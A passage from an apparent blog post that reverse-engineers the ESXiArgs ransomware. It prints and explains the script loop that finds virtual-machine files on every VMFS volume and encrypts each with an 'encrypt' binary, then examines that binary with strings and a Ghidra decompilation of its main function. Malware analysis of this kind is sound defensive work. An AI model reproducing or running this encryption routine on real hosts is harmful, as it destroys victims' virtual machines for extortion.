</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> volume in <span style="color:#c678dd">$(</span><span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#98c379">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#98c379">&#39;  &#39;</span> <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;START VOLUME: </span><span style="color:#e06c75">$volume</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">$&#39;\n&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">for</span> file_e in <span style="color:#c678dd">$(</span> find <span style="color:#98c379">&#34;/vmfs/volumes/</span><span style="color:#e06c75">$volume</span><span style="color:#98c379">/&#34;</span> -type f -name <span style="color:#98c379">&#34;*.vmdk&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmx&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmxf&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsd&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsn&#34;</span> -o -name <span style="color:#98c379">&#34;*.vswp&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmss&#34;</span> -o -name <span style="color:#98c379">&#34;*.nvram&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmem&#34;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>du -k <span style="color:#e06c75">$file_e</span> | awk <span style="color:#98c379">&#39;{print $1}&#39;</span><span style="color:#c678dd">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#e06c75">$size_kb</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#c678dd">$((</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#c678dd">))</span> -gt <span style="color:#d19a66">128</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$((</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">100</span><span style="color:#56b6c2">)-</span><span style="color:#d19a66">1</span><span style="color:#c678dd">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;START ENCRYPT: </span><span style="color:#e06c75">$file_e</span><span style="color:#98c379"> SIZE: </span><span style="color:#e06c75">$size_kb</span><span style="color:#98c379"> STEP SIZE: </span><span style="color:#e06c75">$size_step</span><span style="color:#98c379">&#34;</span> <span style="color:#98c379">&#34;\&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">\&#34; </span><span style="color:#e06c75">$size_step</span><span style="color:#98c379"> 1 </span><span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">echo</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt; <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">.args&#34;</span>
</span></span><span style="display:flex;"><span>        nohup <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt <span style="color:#e06c75">$CLEAN_DIR</span>/public.pem <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">done</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">$&#34; &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span>
</span></span></code></pre></div><p>Let&rsquo;s break this down:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">for</span> volume in <span style="color:#c678dd">$(</span><span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#98c379">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#98c379">&#39;  &#39;</span> <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span></code></pre></div><p>This 1st <code>for loop</code> is going through every volumes in the <code>/vmfs/volumes/</code> directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">for</span> file_e in <span style="color:#c678dd">$(</span> find <span style="color:#98c379">&#34;/vmfs/volumes/</span><span style="color:#e06c75">$volume</span><span style="color:#98c379">/&#34;</span> -type f -name <span style="color:#98c379">&#34;*.vmdk&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmx&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmxf&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsd&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsn&#34;</span> -o -name <span style="color:#98c379">&#34;*.vswp&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmss&#34;</span> -o -name <span style="color:#98c379">&#34;*.nvram&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmem&#34;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span></code></pre></div><p>This 2nd <code>for loop</code> is going to try to find any files in those volumes with the following extensions:</p>
<ul>
<li><code>.vmdk</code></li>
<li><code>.vmx</code></li>
<li><code>.vmxf</code></li>
<li><code>.vmsd</code></li>
<li><code>.vmsn</code></li>
<li><code>.vswp</code></li>
<li><code>.vmss</code></li>
<li><code>.nvram</code></li>
<li><code>.vmem</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>du -k <span style="color:#e06c75">$file_e</span> | awk <span style="color:#98c379">&#39;{print $1}&#39;</span><span style="color:#c678dd">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#e06c75">$size_kb</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#c678dd">$((</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#c678dd">))</span> -gt <span style="color:#d19a66">128</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$((</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">100</span><span style="color:#56b6c2">)-</span><span style="color:#d19a66">1</span><span style="color:#c678dd">))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
</span></span></code></pre></div><p>This part of the script tries to determine the size of the files that it found in the 2nd <code>for loop</code>. The number of steps to encrypt the file (number of MB to skip) is derived from this file size.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nohup <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt <span style="color:#e06c75">$CLEAN_DIR</span>/public.pem <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span></code></pre></div><p>The file path, file size and number of steps are passed into the <code>encrypt</code> binary. The <code>encrypt</code> binary looks to also take in a public key. Then all of that will get pumped into <code>/dev/null</code> to suppress command line output.</p>
<p>The script also calls <code>nohup</code> to execute this binary in the background. This is done to encrypt the files <em>concurrently</em>.</p>
<p>After researching about this malware, I learned that the malware author will leave an <code>encrypt</code> binary and a <code>decrypt</code> binary. The <code>decrypt</code> binary will require a <em>private key</em> that the victim will have to buy from the malware author (usually through bitcoin)</p>
<p>So the <code>encrypt</code> binary is the core of the malware. Let&rsquo;s try analyzing this binary and see how it works.</p>
<h1 id="the-encrypt-binary">The encrypt binary</h1>
<p>First of all, I ran the <code>file</code> command on the binary and got this:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file encrypt
</span></span><span style="display:flex;"><span>encrypt: ELF 64-bit LSB executable, x86-64, version <span style="color:#d19a66">1</span> <span style="color:#56b6c2">(</span>SYSV<span style="color:#56b6c2">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#c678dd">for</span> GNU/Linux 2.6.8, with debug_info, not stripped
</span></span></code></pre></div><p>So we have an <code>ELF 64-bit</code> executable since this malware runs on x64 Intel processors. This is also <code>dynamically linked</code>, so this was probably compiled using standard <code>GCC</code> with no crazy flags.</p>
<p>This was also compiled for <code>GNU/Linux 2.6.8</code> which is a pretty old version of Linux.</p>
<p>The weird thing here is that the binary still has <code>debug_info not stripped</code>. Typically, malware authors would strip the binary of the debugging information which would make reverse engineering their malware a whole lot more difficult. This malware, however, still has all the debugging information as it has not been stripped. This means that all the functions still have the symbols and there&rsquo;s still information from <code>GCC</code> about how this program was compiled.</p>
<p>Next, I ran <code>strings</code> on the binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings encrypt
</span></span></code></pre></div><p>Since the binary was not obfuscated, I started looking for anything related to encrypting and I found this:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>BIO_new_mem_buf
</span></span><span style="display:flex;"><span>ERR_get_error
</span></span><span style="display:flex;"><span>ERR_error_string
</span></span><span style="display:flex;"><span>PEM_read_bio_RSA_PUBKEY
</span></span><span style="display:flex;"><span>PEM_read_bio_RSAPrivateKey
</span></span><span style="display:flex;"><span>RAND_pseudo_bytes
</span></span><span style="display:flex;"><span>RSA_public_encrypt
</span></span><span style="display:flex;"><span>RSA_private_decrypt
</span></span><span style="display:flex;"><span>RSA_size
</span></span></code></pre></div><p><code>PEM_read_bio_RSA_PUBKEY</code> will read some file as a public key. <code>PEM_read_bio_RSAPrivateKey</code> will read some file as a private key. <code>RAND_pseudo_bytes</code> will generate a pseudo-random number, this will probably be used later on for encryption.</p>
<p>We also have <code>RSA_public_encrypt</code> and <code>RSA_private_decrypt</code>. So it looks like this is using <strong>RSA</strong> which is an <em>asymmetric encryption</em> algorithm.</p>
<p>If you don&rsquo;t know what <em>asymmetric encryption</em> is, imagine a mailbox. A mailbox is publically accessible and anyone can drop a letter in it. But only the owner who has the key to the mailbox can unlock it and read the mail in it.</p>
<p><em>Asymmetric encryption</em> is similar to that. It uses 2 keys, <em>public</em> and <em>private</em>. The public key will be handed out to other people. When someone wants to send data to you, they will use the public key that they got from you to encrypt the data and you will use your private key to decrypt the data. This is cryptographically safe because even if a hacker got a hold of the data and the public key, they wouldn&rsquo;t be able to do anything as the public key is useless when it comes to decrypting the data. The data, once encrypted with the public key, can only be decrypted with the private key.</p>
<p>So this binary will <code>RSA_public_encrypt</code> with a public key to encrypt the files and <code>RSA_private_decrypt</code> with a private key to decrypt the files.</p>
<p>Let&rsquo;s load this up into a disassembler to reverse engineer this.</p>
<h1 id="the-disassembling">The disassembling</h1>
<p>I&rsquo;ll be using <a href="https://ghidra-sre.org/">[<strong>Ghidra</strong>]</a> as my disassembler of choice.</p>

    <img src="/img/esxiargs-analysis/ghidra-esxiargs.png"  alt="ESXiArgs in Ghidra"  class="center"  style="padding: 10px"  />


<p>Here&rsquo;s the <code>main</code> function of the <code>encrypt</code> binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e5c07b">long</span> <span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_4c</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_38</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_30</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_28</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">local_20</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">local_18</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">local_c</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">3</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x18</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x20</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">5</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x28</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">init_libssl</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_pk_data</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>),<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_18</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">local_18</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_20</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_file</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x10</span>),<span style="color:#e06c75">local_20</span>,<span style="color:#e06c75">local_28</span>,<span style="color:#e06c75">local_30</span>,<span style="color:#e06c75">local_38</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;encrypt_file&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;create_rsa_obj&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;get_pk_data&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;init_libssl returned %d</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>,(<span style="color:#e06c75">ulong</span>)<span style="color:#e06c75">local_c</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_4c</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s break down what we&rsquo;re seeing here.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e5c07b">long</span> <span style="color:#e06c75">param_2</span>)
</span></span></code></pre></div><p>We can see that the <code>main</code> function will take in 2 parameters. In C programs, these 2 parameters will usually be <code>argc</code> and <code>argv</code>. <code>argc</code> is the argument counter and <code>argv</code> is the array that holds all the arguments.</p>
<p>Just to make it easier to analyze this binary, I&rsquo;ll rename the symbols as we analyze them. I&rsquo;ll rename <code>param_1</code> to <code>argc</code> because <code>param_1</code> is definitely the argument counter. And I&rsquo;ll rename <code>param_2</code> to <code>argv</code>.</p>
<p>Since <code>param_2</code>&rsquo;s type is <code>long</code>, I&rsquo;ll change it back to being <code>char**</code> using Ghidra&rsquo;s retype variable feature.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">argc</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">3</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see there&rsquo;s a usage text here. So we need 3 arguments for this program or this message will show up. And we can see that this binary needs a public key and a path to the file to be encrypted.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">3</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">4</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">5</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">5</span>]);
